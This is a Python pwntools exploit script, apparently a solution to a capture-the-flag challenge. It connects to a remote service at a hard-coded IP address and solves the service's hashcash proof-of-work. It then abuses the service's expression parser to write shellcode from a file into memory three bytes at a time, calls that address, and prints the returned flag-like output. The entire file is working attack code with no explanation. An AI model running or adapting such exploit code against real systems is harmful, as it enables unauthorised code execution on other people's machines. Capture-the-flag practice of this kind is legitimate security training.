#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

host = args.HOST or '54.93.211.13'
port = int(args.PORT or 10000)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return process(['debug.sh'] + argv, *a, **kw)
    else:
        return process(['run.sh'] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    hash_challenge = io.recvline().split()
    if hash_challenge[0] == b'hashcash' and hash_challenge[1] == b'-mb28':
        response = subprocess.run([
            'hashcash',
            '-mb28',
            hash_challenge[2].decode(),
        ], capture_output=True).stdout
        io.send(response)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

shellcode = open('shellcode.bin', 'rb').read()

def set_var(name, value):
    print(name, hex(value))
    io.sendafter(b'> ', name + b'=0' + b'+9' * (value // 9) + b'+' + str(value % 9).encode() + b'\n')
    io.recvline()

def write_3(x):
    x = x.ljust(3, b'\x00')
    set_var(x[0:1], u16(x[1:3]))

io = start()

shellcode_addr = 0x7ce0
set_var(b'a', shellcode_addr)

for i in range(0, len(shellcode), 3):
    write_3(shellcode[i:i+3])

io.sendafter(b'> ', b'a(0)')

io.recvuntil(b')')
print(io.recvuntil(b'}'))
